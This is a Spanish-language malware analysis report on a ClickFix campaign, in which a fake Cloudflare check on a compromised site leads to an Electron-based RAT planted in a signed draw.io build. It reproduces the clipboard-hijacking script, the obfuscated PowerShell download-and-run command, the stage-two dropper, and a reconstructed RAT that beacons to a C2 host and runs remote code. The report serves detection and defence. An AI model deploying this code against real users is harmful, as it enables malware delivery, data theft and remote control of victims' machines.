# Análisis técnico de campaña ClickFix con dropper Electron firmado y RAT en Node.js

- **Caso:** sitio web institucional comprometido sirviendo un overlay de verificación falso (clon de Cloudflare Turnstile) que entrega un RAT en Electron al visitante mediante secuestro de portapapeles y ejecución manual por parte del usuario.
- **Fecha:** 2026.05.04

> Reporte combinado. La parte de PE/Authenticode, disección del asar y reimplementación en Python del decoder fue trabajo del equipo. La tabla completa de strings deobfuscados, queries de SIEM, reglas Suricata, fingerprint de la campaña y el toolkit `ClickFix_Extractor` (https://github.com/Czr-Xploit/ClickFix_Extractor) corresponden al análisis paralelo de Czr.Xploit. Las dos líneas de trabajo llegaron a conclusiones convergentes por caminos independientes, lo que aporta confianza al resultado final.
>
> Por consideraciones legales, el sitio víctima se referencia en el informe como "el sitio comprometido" y el dominio aparece defangeado (`yourdomain[.]com`) en las secciones narrativas. Los IOCs y queries listados conservan los valores accionables para que defensores puedan operar con ellos. La organización propietaria del dominio no está acusada en este documento, su sitio fue comprometido y abusado.

---
## Resumen ejecutivo

Una campaña ClickFix activa entrega un Troyano de Acceso Remoto (RAT) basado en Electron mediante una página falsa de verificación humana de Cloudflare hosteada en un sitio institucional comprometido. La cadena se compone de cuatro etapas:

1. **Entrega:** un overlay HTML clonado de Cloudflare Turnstile, servido sobre el contenido legítimo del sitio víctima, secuestra el evento `copy` global y deja un comando PowerShell ofuscado en el portapapeles del visitante. Las instrucciones del overlay inducen al usuario a ejecutarlo mediante el cuadro `Win+R`.
2. **Stager PowerShell:** `iex(irm 'ccudmcx[.]xyz/u')` ofuscado por concatenación de strings. Descarga un script secundario de mayor tamaño.
3. **Dropper PS1 con bloque `finally{}`:** simula un tutorial inocuo de PowerShell. El bloque `finally` escribe `runner.ps1` en `%TEMP%`, descarga `update.zip` (134 MB) desde el dominio de staging y extrae su contenido a `%LOCALAPPDATA%\UpdateApp\`.
4. **Aplicación Electron troyanizada:** el binario `draw.io.exe` extraído del ZIP es el ejecutable original de drawio.desktop v19.0.3 firmado por JGraph Ltd. El componente modificado es `resources/app.asar`, donde el archivo `electron.js` se reemplazó por un loader RAT en Node.js ofuscado con obfuscator.io. La carga es viable porque Electron 19 no valida la integridad del asar (la flag `enableEmbeddedAsarIntegrityValidation` se introdujo en versiones posteriores).

El RAT mantiene un beacon HTTPS POST cada 65 segundos hacia `chimefusion[.]com/u/`, exfiltrando un identificador persistente, el `COMPUTERNAME` y el `USERNAME` del host. Soporta dos modos de ejecución remota: `eval()` de JavaScript arbitrario en el contexto Node de Electron, o drop de archivos codificados en base64 con auto.ejecución del primero que termine en `.exe`. La persistencia se establece mediante `app.setLoginItemSettings({openAtLogin:true})`, lo que crea una entrada en `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.

El componente más relevante desde el punto de vista de evasión es la reutilización de la firma Authenticode legítima de JGraph Ltd. El atacante no falsificó la firma ni comprometió la llave del publisher: tomó un binario válido y lo combinó con un asar malicioso. SmartScreen y los EDR basados en reputación de firma observan un publisher de confianza y permiten la ejecución.

### Estadísticas clave

| Métrica                          | Valor                          |
| -------------------------------- | ------------------------------ |
| Dominios identificados           | 3 (sitio víctima, staging, C2) |
| Etapas del ataque                | 4                              |
| Strings ofuscados                | 1 015                          |
| Strings reemplazados con éxito   | 1 059 sustituciones, 0 fallos  |
| Intervalo de beacon              | 65 000 ms                      |
| Técnicas MITRE ATT&CK aplicables | 17                             |
| Modos de ejecución del C2        | 2 (eval JS o drop+exec base64) |
|                                  |                                |

---

## Cadena de ataque

```
Sitio comprometido (yourdomain[.]com) sirviendo overlay falso
    │ clic en "Verify you are human"
    │
    ▼
Stage 1. JS deja en el clipboard:
    powershell "Write-Host(&{iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))})2>$null"
    │ Win+R, Ctrl+V, Enter
    │
    ▼
Stage 2. ccudmcx[.]xyz/u/  →  script.ps1 (decoy + dropper en finally)
    │ Set-Content $env:TEMP\runner.ps1
    │ Start-Process powershell -WindowStyle Hidden -ExecutionPolicy Bypass
    │
    ▼
Stage 3. runner.ps1
    │ Invoke-WebRequest ccudmcx[.]xyz/update.zip → %TEMP%\update26.zip
    │ Expand-Archive → %LOCALAPPDATA%\UpdateApp\
    │ Start-Process %LOCALAPPDATA%\UpdateApp\draw.io.exe
    │
    ▼
Stage 4. draw.io.exe firmado por JGraph carga resources\app.asar
    El asar contiene electron.js reemplazado: RAT Node.js ofuscado.
    Persistencia + beacon cada 65s + RCE por eval() o drop+exec.
```

---

## Stage 1. Página de entrega y secuestro de portapapeles

El equipo recuperó el HTML servido por el sitio víctima con `curl --compressed` (la respuesta utiliza codificación Brotli). Las cabeceras documentan la infraestructura:

```
HTTP/2 200
content-encoding: br
server: Sucuri/Cloudproxy
x-sucuri-cache: HIT
x-sucuri-id: 17028
content-security-policy: upgrade-insecure-requests;
```

El header `x-sucuri-cache: HIT` confirma que el contenido malicioso está cacheado en el WAF, lo que indica una persistencia mínima del payload en el origen y descarta una entrega selectiva por User.Agent. El cuerpo es una réplica visual del intersticial "Just a moment..." de Cloudflare: SVG del logo, paleta cromática, soporte de modo oscuro (`@media (prefers-color-scheme: dark)`), Ray ID falso, y enlaces a "Privacy" y "Help". La calidad visual del clon es elevada.

El payload reside al final del documento, dentro de un `<script>` minificado:

```js
(function() {
    var mw = "powershell \"Write-Host(&{iex(irm(('ccud'+'mcx')+('.x'+'yz\\/u')))})2>$null\"";

    var zc  = document.getElementById('Qifagur');     // contenedor del diálogo
    var x   = document.getElementById('Tetoxa');      // botón Verify
    var jy  = document.getElementById('Lekekixevoh'); // display del Verification ID

    var qx = document.querySelectorAll('.step0');     // spinner inicial
    var j  = document.querySelectorAll('.step1');     // botón
    var qi = document.querySelectorAll('.step2');     // instrucciones
    var kc = document.querySelectorAll('.step3');     // completado

    function g() { return Math.floor(100000 + Math.random() * 900000); }

    function o(t) {
        var b = document.createElement('textarea');
        b.value = t;
        b.style.position = 'absolute';
        b.style.left = '-9999px';
        document.body.appendChild(b);
        b.select();
        document.execCommand('copy');
        document.body.removeChild(b);
    }

    var p = g(); jy.textContent = p;

    qx.forEach(function(e) { e.style.display = 'block'; e.classList.add('active'); });
    setTimeout(function() {
        qx.forEach(function(e) { e.style.display = 'none'; e.classList.remove('active'); });
        j.forEach(function(e) { e.style.display = 'block'; e.classList.add('active'); });
    }, 2500);

    x.addEventListener('click', function() {
        var ug = mw + ' # Security check ✔️ I\'m not a robot Verification ID: ' + p;
        o(ug);
    });

    document.addEventListener('copy', function(e) {
        e.preventDefault();
        var ug = mw + ' # Security check ✔️ I\'m not a robot Verification ID: ' + p;
        if (e.clipboardData) e.clipboardData.setData('text/plain', ug);
        else if (window.clipboardData) window.clipboardData.setData('Text', ug);
    });
})();
```

El script implementa dos vectores complementarios. Primero, al hacer clic en el checkbox de verificación, copia el comando al portapapeles mediante un `textarea` oculto y `document.execCommand('copy')`. Segundo, sobreescribe el handler global del evento `copy`: cualquier intento del usuario por copiar contenido arbitrario de la página termina sustituyendo el contenido del portapapeles por el comando del atacante. El operador implementa redundancia para garantizar la entrega del payload incluso si el usuario interactúa de formas no anticipadas.

Para reducir las sospechas del usuario al ver un comando largo en el cuadro de Ejecutar, el JS concatena un comentario PowerShell con un identificador alfanumérico simulado:

```text
powershell "Write-Host(...)2>$null" # Security check ✔️ I'm not a robot Verification ID: 478392
```

El "Verification ID" es decorativo. Se genera con `Math.floor(100000 + Math.random() * 900000)` en cada carga y cambia entre visitas. PowerShell trata el contenido posterior a `#` como comentario, por lo que no afecta la ejecución. El propósito es ingeniería social: presenta el comando como un código de verificación legítimo.

Las instrucciones que se muestran al visitante tras el primer clic:

> 1. Press & hold the Windows Key + R.
> 2. In the verification window, press Ctrl + V.
> 3. Press Enter on your keyboard to finish.
>
> You will observe and agree:
> ✅ "I am not a robot, reCAPTCHA Verification ID: {random}"

![](img/clickfix-victim.png)

Resolución de la ofuscación del comando:

```text
('ccud'+'mcx')+('.x'+'yz\/u')   →  "ccudmcx.xyz/u"
irm                             →  Invoke.RestMethod
iex                             →  Invoke.Expression
&{ ... }                        →  script.block (evita que iex emita el código)
2>$null                         →  silencia stderr
Write.Host(...)                 →  fachada inocua
```

Equivalente funcional: `powershell -c "iex(irm 'https://ccudmcx[.]xyz/u')"`. Patrón de ofuscación trivial pero efectivo contra detecciones por string match.

---

## Stage 2. Stager PowerShell con abuso de finally{}

`/u` redirige con un 301 a `/u/`, donde el servidor entrega:

```
HTTP/2 200
content-type: application/octet-stream
content-disposition: attachment; filename="script.ps1"
server: cloudflare
```

El equipo guardó la respuesta en `stage2_payload.txt`. SHA.256: `85b38a1adaf13650d06966572e402415ac3aa7ec9f53adb6e5eb48ae8b0f9974`, 2 564 bytes:

```powershell
$logFolder = "$env:LOCALAPPDATA\Microsoft\Cache"
if (!(Test-Path $logFolder)) { New-Item -ItemType Directory -Path $logFolder -Force | Out-Null }
$logFile = "$logFolder\demo.log"

function Write-Log($Message) {
    $ts = Get-Date -Format "HH:mm:ss"
    "[$ts] $Message" | Out-File -FilePath $logFile -Append
}

try {
    # Sección señuelo. Simula un tutorial básico de PowerShell.
    $name="PowerShell"; $number=10; $items=@("apple","banana","cherry")
    $info=@{ Language="PowerShell"; Year=2006 }
    Write-Log "String: $name, Number: $number"
    if ($number -gt 5) { Write-Log "$number is greater than 5" } ...
    foreach ($item in $items) { Write-Log "Fruit: $item" }
    function Get-Square($n) { return $n * $n }
    Write-Log "Script completed successfully"
} catch {
    Write-Log "Unexpected error: $($_.Exception.Message)"
} finally {
    # Payload real. Este bloque se ejecuta independientemente del resultado del try/catch.
    $script = @'
$downloadUrl     = "https://ccudmcx.xyz/update.zip"
$appDataPath     = [Environment]::GetFolderPath("LocalApplicationData")
$subFolder       = "UpdateApp"
$destinationPath = Join-Path $appDataPath $subFolder
$zipPath         = Join-Path $env:TEMP "update26.zip"
...
Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing
Expand-Archive    -Path $zipPath -DestinationPath $destinationPath -Force
Remove-Item       $zipPath -Force
Start-Process     -FilePath "$destinationPath\draw.io.exe"
'@
    $path = "$env:TEMP\runner.ps1"
    $script | Set-Content -Path $path -Encoding UTF8
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden
}
```

Tres elementos relevantes. El bloque `try/catch/finally` garantiza la ejecución del dropper aunque el código del señuelo genere excepciones. La ruta `%LOCALAPPDATA%\Microsoft\Cache\demo.log` simula una carpeta de telemetría del sistema y reduce la sospecha durante una inspección manual. El stage final se lanza con `-ExecutionPolicy Bypass` y `-WindowStyle Hidden`, lo que evita el bypass interactivo de la política y suprime cualquier ventana visible.

Resumen de las técnicas de evasión identificadas en este stage:

| Técnica | Implementación | Propósito |
|---|---|---|
| Bloque try{} señuelo | logs benignos en `demo.log` | una revisión superficial observa un script aparentemente educativo |
| Abuso de finally{} | payload en `finally{}`, ejecución garantizada | tolera errores del señuelo sin abortar el flujo malicioso |
| Ejecución indirecta | `runner.ps1` escrito a disco y lanzado en proceso aparte | desacopla el código de descarga del comando original observable |
| Ventana oculta | `-WindowStyle Hidden` | sin elementos visuales |
| Bypass de policy | `-ExecutionPolicy Bypass` | evita restricciones por defecto |
| Borrado del ZIP | `Remove-Item $zipPath -Force` | minimiza evidencia post.extracción |
| `UseBasicParsing` | sin dependencia del motor IE | compatible con hosts sin Internet Explorer instalado |

---

## Stage 3 y 4. Paquete Electron troyanizado

`update.zip` se recuperó con `curl` sin ejecución. 134 MB, SHA.256 `d942e9cfc0ca32a3d66ec690090ee22dca74953efed6889fb2292de36f5e39fd`. El contenido corresponde a un build completo de drawio.desktop:

| Archivo | Tamaño | SHA.256 | Veredicto |
|---|---|---|---|
| `draw.io.exe` | 148 962 456 | `bfcd61c6b2dc98354f1a1a6e20a3d61c94530f2c39f3f4c708252da4db57ba9f` | Genuino, firmado por JGraph Ltd |
| `resources/app.asar` | 158 440 947 | `0642708ec7c25dec3168f1ab275a29bfd3cf69fe3afc3d5c6eadfa6750102883` | Modificado. `electron.js` reemplazado |
| `resources/app-update.yml` | 119 | `0ed01d7f...` | Sin alteraciones |
| `ffmpeg.dll`, `d3dcompiler_47.dll`, `libEGL.dll`, `libGLESv2.dll`, `vulkan-1.dll`, `vk_swiftshader.dll`, locales/*.pak, ... | varios | varios | Runtime de Chromium/Electron, no modificados |

Análisis del PE de `draw.io.exe` con `objdump -p`:

```
Format: PE32+ (x86.64), 15 secciones
Subsystem: Windows GUI
Time/Date stamp: 2022.06.02 22:31:56 UTC
DllCharacteristics: HIGH_ENTROPY_VA, DYNAMIC_BASE, NX_COMPAT, GUARD_CF, TERMINAL_SERVICE_AWARE
Imports: ffmpeg.dll, UIAutomationCore.dll, dbghelp.dll, MSIMG32.dll, OLEAUT32.dll,
         WINMM.dll, WS2_32.dll, KERNEL32.dll, CRYPT32.dll, IPHLPAPI.dll,
         VERSION.dll, USERENV.dll, DWrite.dll, WINSPOOL.DRV, Secur32.dll,
         WINHTTP.dll, dhcpcsvc.dll
Security Directory @ file_offset 0x08e0ae00, size 0x4e98 (20 120 bytes)
```

El timestamp 2022.06.02 corresponde al release oficial de drawio.desktop v19.0.3. Los imports, secciones y características DLL coinciden con un build estándar de Electron 19 sobre Chromium 102. No se observan indicadores de inyección en el PE.

El equipo extrajo el blob de la Security Directory directamente desde el PE mediante un parser en Python (la VM no contaba con `osslsigncode` instalado y el repositorio apt presentaba problemas de conectividad), persistió el resultado en `drawio_authenticode.p7` y lo procesó con `strings` para identificar la cadena de confianza:

```
Subject:        CN = "JGraph Ltd", O = "JGraph Ltd", L = "Northampton", C = GB
Subject email:  https://github.com/jgraph/drawio
CA firmante:    "SSL.com Code Signing Intermediate CA RSA R1"
Root:           "SSL.com Root Certification Authority RSA"
Counter-signer: "Certum Trusted Network CA"
Timestamp:      "DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA"
                "DigiCert Timestamp 2022"
```

La firma corresponde efectivamente a JGraph Ltd. El atacante no la falsificó, no comprometió la llave privada del publisher y no clonó el certificado. Tomó el binario íntegro y modificó únicamente el `app.asar` adyacente. Esta táctica funciona porque Electron 19 carga el archivo asar como datos sin validar su integridad. La bandera `enableEmbeddedAsarIntegrityValidation`, que mitiga este vector, fue introducida en Electron 22 y posteriores. Como consecuencia, SmartScreen registra "JGraph Ltd, publisher conocido", los EDR basados en reputación de firma marcan el binario como confiable, y el código del atacante se ejecuta dentro de un proceso firmado.

Este es el componente más significativo del ataque desde el punto de vista de evasión. La versión oficial drawio.desktop v19.0.3 sigue siendo descargable y, al cierre de este informe, continúa pasando los controles de "binario firmado por publisher conocido" sin ser bloqueada.

`ffmpeg.dll` se analizó por separado con `strings -e l` y `objdump -p`. La salida coincide con los símbolos esperados de FFmpeg/Chromium: `Huffyuv FFmpeg variant`, `Electronic Arts CMV video`, codecs de `libavcodec`. No se detectan URLs, secciones añadidas ni imports anómalos. **No se observa DLL sideloading.** La actividad maliciosa reside íntegramente en el código JavaScript interpretado por Electron.

### Modificaciones al asar

El equipo extrajo el header del asar mediante un parser Python a medida (4 bytes pickle, header JSON, body) y enumeró el contenido:

```
electron.js              57 822 bytes   ← componente modificado
electron-preload.js                     ← intacto
package.json    {"name":"draw.io","version":"19.0.3","main":"electron.js",...}
disableUpdate.js                        ← retorna false, irrelevante para el flujo
templates/, *.html, workbox-*.js        ← intactos
```

Solo el entry point fue reemplazado. El resto del paquete se mantiene como decorado para que una inspección visual del archivo continúe pareciendo legítima. El `package.json` no se modificó, por lo que `"main": "electron.js"` apunta exactamente al archivo reescrito por el atacante.

---

## Análisis del RAT

`asar_electron.js` está ofuscado mediante obfuscator.io en su variante de dos argumentos. La firma del decoder es `d(idx, key)`, donde `idx` es un índice y `key` la clave RC4 específica del string. La cadena de literales reside en `function c() { const W = [...]; ...; return W; }`.

El equipo identificó los componentes de la ofuscación:

- Array de 1 015 entradas dentro de `c()`. Cada entrada es texto base64 codificado con un alfabeto reordenado (minúsculas, mayúsculas, dígitos, `+/=`).
- Decoder `d(W, o)` que: (1) resta 229 al índice recibido, (2) recupera la entrada correspondiente del array, (3) decodifica con base64 alfabeto custom, (4) aplica RC4 con la clave del segundo argumento, (5) retorna la cadena UTF.8 resultante.
- Sin rotación. El módulo fue construido con `rotateStringArray: false`, por lo que el array permanece estático.

El equipo reimplementó las dos primitivas en Python (`deobfuscate.py`), validó la equivalencia con un sanity check de cinco strings de control, y aplicó una sustitución global con `re.sub` sobre el archivo completo usando el patrón `(\w+)\s*\(\s*(\d+)\s*,\s*"([^"]{2,8})"\s*\)`. El proceso reemplazó cada llamada al decoder por el literal correspondiente.

Resultado: 1 059 reemplazos exitosos, 0 fallos. La fuente legible quedó en `electron_decoded.js`. Una pasada adicional con un pretty.printer casero (Python, brace.aware) generó `electron_pretty.js` con 1 917 líneas formateadas.

### Esquema de cifrado

Cada string sensible se accede como `bx(índice, clave)`. Ejemplo: `bx(264, "hH#x")`.

```
bx(264, "hH#x")
  │      │
  │      └─ Clave RC4 específica del string
  └─ Índice del array (264 . 229 = posición 35 real)
```

**Paso 1: base64 con alfabeto modificado.**

```
Estándar    : ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
Atacante    : abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=
```

Las letras minúsculas preceden a las mayúsculas. Esta inversión derrota cualquier decoder base64 estándar y cualquier expresión regular que asuma el alfabeto canónico para detectar bloques codificados.

**Paso 2: RC4 con clave por.string.**

```js
var W = function(W, c) {  // W = base64 ya decodificado, c = clave
    let o=[], d=0, k, e="";
    W = t(W);

    // KSA
    for (n=0; n<256; n++) { o[n] = n; }
    for (n=0; n<256; n++) {
        d = (d + o[n] + c["charCodeAt"](n % c["length"])) % 256;
        k=o[n]; o[n]=o[d]; o[d]=k;
    }

    // PRGA
    n=0; d=0;
    for (let c=0; c < W["length"]; c++) {
        n = (n+1) % 256;
        d = (d + o[n]) % 256;
        k=o[n]; o[n]=o[d]; o[d]=k;
        e += String["fromCharCode"](
            W["charCodeAt"](c) ^ o[(o[n]+o[d]) % 256]
        );
    }
    return e;
};
```

Implementación equivalente en Python (`deobfuscate.py`):

```python
ALFABETO = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/="

def custom_b64_decode(s: str) -> bytes:
    bits, bit_count, output = 0, 0, []
    for ch in s:
        val = ALFABETO.find(ch)
        if val == -1 or ch == '=': continue
        bits = (bits << 6) | val
        bit_count += 6
        if bit_count >= 8:
            bit_count -= 8
            output.append((bits >> bit_count) & 0xFF)
    return bytes(output)

def rc4(key: str, data: str) -> str:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0; out = []
    for ch in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(chr(ord(ch) ^ S[(S[i] + S[j]) % 256]))
    return ''.join(out)

def decode(encoded: str, key: str) -> str:
    raw = custom_b64_decode(encoded).decode('latin-1')
    return rc4(key, raw)

# Sanity check:
# decode("eSkPW7y0WPX9jCkOW7e/W4PdW6XKW73dRmkMna", "hH#x")
# →  "chimefusion.com/u/"
```

### Código operativo (líneas 1 a 267)

Reconstrucción anotada del comportamiento del RAT:

```js
const { app: g } = require("electron");
const h = require("fs");
const i = require("https");

// HTTP wrapper sobre https.request, deshabilita validación de certificados.
function j(url, opts = {}) {
    return new Promise((resolve, reject) => {
        const parts = url.split("/");
        const hostname = parts[0];
        const path = "/" + parts.slice(1).join("/");
        const req = i.request({
            hostname, path,
            method: opts.method || "GET",
            headers: opts.headers || {},
            rejectUnauthorized: false
        }, res => {
            const chunks = [];
            res.on("data",  c => chunks.push(c));
            res.on("end",  () => {
                const buf = Buffer.concat(chunks);
                resolve({
                    ok:      res.statusCode >= 200 && res.statusCode < 300,
                    status:  res.statusCode,
                    headers: res.headers,
                    json: () => Promise.resolve(JSON.parse(buf.toString())),
                    text: () => Promise.resolve(buf.toString())
                });
            });
        });
        req.on("error", reject);
        if (opts.body) req.write(opts.body);
        req.end();
    });
}

// C2.
const k = "chimefusion.com/u/";

// Helpers de path.
function pathJoin(...W) { return W.join("\\"); }
function dirname(W)    { const o = W.split("\\"); o.pop(); return o.join("\\") || "\\"; }

// ID persistente de la víctima en %APPDATA%\setup.txt
function getVictimId() {
    const f = pathJoin(process.env.APPDATA, "setup.txt");
    if (h.existsSync(f)) return h.readFileSync(f, "utf8").trim();
    const id = Math.random().toString(36).slice(2, 10);
    h.writeFileSync(f, id);
    return id;
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

// Beacon al C2.
async function beacon() {
    try {
        const res = await j(k, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify([
                getVictimId(),
                process.env.COMPUTERNAME,
                process.env.USERNAME
            ])
        });
        const cmd = await res.json();
        if (cmd.task) executeTask(cmd.task);
    } catch (e) { console.log(e); }
}

// Ejecutor de tareas recibidas del C2.
function executeTask(s) {
    if (s.e) {                           // tarea tipo "eval"
        try { eval(s.e); } catch (_) {}
        return;
    }
    // tarea tipo "drop & run"
    const dir = pathJoin(process.env.TEMP, String(Date.now()));
    h.mkdirSync(dir, { recursive: true });
    const files = s.files || {};
    let exeToRun = null;
    for (const [name, b64] of Object.entries(files)) {
        const out  = pathJoin(dir, name);
        const sub  = dirname(out);
        if (sub !== dir) h.mkdirSync(sub, { recursive: true });
        h.writeFileSync(out, Buffer.from(b64, "base64"));
        if (name.endsWith(".exe")) exeToRun = out;
    }
    if (exeToRun) require("child_process").exec(`"${exeToRun}"`, { cwd: dir });
}

// Persistencia. En Windows se traduce a una entrada en HKCU\...\Run.
g.setLoginItemSettings({
    openAtLogin: true,
    openAsHidden: false,
    path: g.getPath("exe"),
    args: []
});

// Loop infinito de baliza, intervalo de 65 segundos.
async function loop() {
    while (true) {
        await beacon();
        await sleep(65_000);
    }
}

// IIFE principal.
(async () => {
    await loop();   // Esta llamada nunca retorna.
    /* El código legítimo de drawio sigue presente más abajo en el archivo
       (BrowserWindow, Menu, ipcMain, autoUpdater) pero queda inalcanzable.
       Nunca se ejecuta. */
})();
```

El último bloque es operacionalmente significativo. La IIFE principal invoca `await loop()` antes de inicializar cualquier componente de drawio. Como `loop()` no termina, el código legítimo de la aplicación permanece inalcanzable. La víctima observa un proceso `draw.io.exe` activo en el Administrador de tareas pero sin ventana, sin icono de bandeja y sin actividad de UI, únicamente tráfico hacia el C2.

Una conclusión derivada de la arquitectura del implante: **no incorpora keylogger, stealer de cookies, lector de wallets, captura de pantalla ni módulos de recolección específicos.** Funciona como un loader puro. La capacidad real de la operación depende de los payloads que el operador empuje a través de `task.e` o `task.files`. Dado que `eval()` corre en el contexto Node de Electron y `child_process.exec` permite ejecución arbitraria, la superficie disponible incluye despliegue de stealers comerciales, herramientas de RDP, ransomware, agentes de movimiento lateral o cualquier combinación. La capacidad efectiva es total.

### Mecanismo anti.análisis

El decoder incluye una clase con métodos `RxbwXB`, `NsLnHG`, `eMiPXE` que construye una expresión regular y la evalúa contra `function.toString()`. Es el patrón estándar de obfuscator.io para detectar manipulaciones del prototipo `Function.prototype.toString` por parte de debuggers o herramientas de instrumentación. Si se detecta hooking, la expresión regular falla y el flujo entra en una rama alternativa que introduce ruido. Bajo ejecución directa con Node, la verificación pasa y el comportamiento es transparente. Se incluye como referencia para reglas YARA basadas en firma textual.

```js
const W = function(W) {
    this["WkoEMv"]  = W;
    this["LjzrrV"]  = [1, 0, 0];
    this["sjtiEX"]  = function() { return "newState" };
    this["LasAqb"]  = "\\w+ *\\(\\) *{\\w+ *";
    this["tXLlbx"]  = "['|\"].+['|\"];? *}";
};

W["prototype"]["RxbwXB"] = function() {
    const W = new RegExp(this["LasAqb"] + this["tXLlbx"]);
    const c = W["test"](this["sjtiEX"]["toString"]()) ?
        --this["LjzrrV"][1] :
        --this["LjzrrV"][0];
    return this["NsLnHG"](c);
};
```

---

## Tabla de strings deobfuscados

Selección de las entradas relevantes. El array completo decodificado se preserva en `deobfuscated_strings.json`.

### Red y C2

| Índice | Clave | Valor | Propósito |
|---|---|---|---|
| 238 | bp5r | `https` | módulo HTTP |
| 244 | OSNE | `GET` | método por defecto |
| 264 | hH#x | **`chimefusion.com/u/`** | **endpoint C2** |
| 278 | KZf( | `POST` | método del beacon |
| 279 | oE9X | `application/json` | content.type del beacon |
| 281 | vSnX | `json` | parser de respuesta |
| 282 | cPaY | `task` | clave de respuesta del C2 |
| 343 | uNNH | `https://convert.diagrams.net/node/export` | URL legítima de drawio (tráfico de cobertura) |

### Filesystem e identidad

| Índice | Clave | Valor | Propósito |
|---|---|---|---|
| 269 | c#qa | `setup.txt` | persistencia del UUID |
| 270 | bp5r | `existsSync` | verificación de archivo |
| 271 | cPaY | `readFileSync` | lectura del UUID |
| 272 | yymO | `utf8` | encoding |
| 273 | VXbq | `trim` | normalización del string |
| 274 | OSNE | `random` | Math.random() para UUID |
| 275 | nOgL | `toString` | conversión a base36 |
| 276 | uNNH | `slice` | substring del UUID |
| 277 | i@Fs | `writeFileSync` | escritura del UUID |
| 285 | rk]J | `now` | Date.now() para drop dir |
| 287 | VXbq | `files` | clave de archivos en respuesta C2 |
| 292 | PRE$ | `base64` | decoder |
| 294 | Emk2 | `.exe` | sufijo ejecutable |

### Ejecución y persistencia

| Índice | Clave | Valor | Propósito |
|---|---|---|---|
| 295 | 7^k9 | `child_process` | módulo de ejecución |
| 296 | KZf( | `exec` | invocación de comandos |
| 297 | $(YR | `setLoginItemSettings` | **API de persistencia** |
| 298 | %5yA | `getPath` | resolución del path del ejecutable |
| 299 | yymO | `exe` | tipo de path |
| 313 | Emk2 | `child_process` | referencia secundaria |
| 314 | s0$R | `spawn` | creación de proceso |

### Importaciones de módulos

| Índice | Clave | Valor | Rol |
|---|---|---|---|
| 237 | mZk4 | `electron` | framework |
| 238 | bp5r | `https` | cliente HTTP |
| 300 | OSNE | `fs/promises` | filesystem asíncrono |
| 301 | ]rFV | `path` | utilidades de rutas |
| 303 | zAD5 | `electron` | APIs |
| 306 | FaXl | `electron-log` | logging |
| 308 | $zG1 | `electron-updater` | autoupdate (presente como dead code) |
| 311 | oE9X | `electron-store` | configuración (presente como dead code) |

Las importaciones de `electron-updater` y `electron-store` (índices 308 y 311) son notables porque el RAT no las invoca en ningún punto del flujo. Permanecen como código inerte, posiblemente para reducir la divergencia entre el blob ofuscado y el `electron.js` original de drawio, dificultando una comparación visual rápida con la fuente legítima.

---

## Protocolo C2

### Beacon (request)

```http
POST /u/ HTTP/1.1
Host: chimefusion.com
Content-Type: application/json
Connection: close

["k7x2m9p1", "DESKTOP-ABC123", "john.doe"]
```

Tres campos en un array JSON. UUID base36 de 8 caracteres generado y persistido por el RAT en `%APPDATA%\setup.txt` durante la primera ejecución. `process.env.COMPUTERNAME` (hostname Windows). `process.env.USERNAME` (usuario activo). Es el conjunto mínimo necesario para que el operador identifique a la víctima en su panel.

### Respuesta sin tarea

```json
{}
```

El RAT evalúa `if (data['task'])`. Cualquier valor falsy (incluyendo un objeto sin la clave `task`) hace que el ciclo retorne al sleep de 65 segundos sin ejecutar nada.

### Respuesta con tarea de eval

```json
{
  "task": {
    "e": "require('child_process').exec('net user /domain', function(err, out) { /* exfil */ })"
  }
}
```

`task.e` se entrega directamente a `eval()` en el contexto Node de Electron. Permite acceso completo a `fs`, `child_process`, `https`, registro Windows mediante `child_process.exec("reg ...")`, captura de pantalla a través de `webContents`, y cualquier otra API disponible en el runtime.

### Respuesta con drop+exec

```json
{
  "task": {
    "files": {
      "payload.exe": "TVqQAAMAAAAEAAAA//8AALgAAAAAA...",
      "config.dat":  "dGhpcyBpcyBhIGNvbmZpZw=="
    }
  }
}
```

Cada par `name → base64` se decodifica y se escribe en `%TEMP%\<unix_ms>\name`. El primer archivo cuyo nombre termine en `.exe` se ejecuta mediante `child_process.exec(...)` con `cwd` apuntando al drop dir.

### Temporización del beacon

```
T=0s    → draw.io.exe arranca
T=0s    → primer beacon (inmediato)
T=65s   → segundo beacon
T=130s  → tercero
T=N*65s → continúa indefinidamente
```

El intervalo de 65 segundos es atípico. Las familias estándar suelen utilizar intervalos redondos (30, 60, 120 segundos) o aleatorios con jitter. El valor hardcodeado 65 funciona como huella del actor y es útil para pivoting.

---

## Infraestructura del atacante

| Componente | Detalle |
|---|---|
| Sitio víctima | `yourdomain[.]com`, IP `192.124.249.28`, detrás de Sucuri Cloudproxy |
| Staging | `ccudmcx[.]xyz`, IPs `104.21.0.150`, `172.67.151.28`, NS `ziggy/etienne.ns.cloudflare.com` |
| C2 | `chimefusion[.]com`, IPs `104.21.85.162`, `172.67.207.163`, NS `rene/tess.ns.cloudflare.com` |
| Endpoint C2 | `POST https://chimefusion[.]com/u/`, `Content-Type: application/json`, body `["<id>","<host>","<user>"]` |
| CORS | abierto, `Access-Control-Allow-Origin: *`, `Methods: GET,POST,DELETE,PUT,OPTIONS` |
| Comportamiento HTTP | `GET /` → 200, `GET /u` → 301 a `/u/`, `GET /u/` → 400 (rechaza GET con `application/json`), POST sin body válido mantiene la conexión abierta hasta timeout |

Los dos dominios maliciosos están alojados en Cloudflare con pares de NS distintos. Es un patrón típico de operadores que separan staging y C&C en zonas independientes para minimizar el impacto de un takedown parcial.

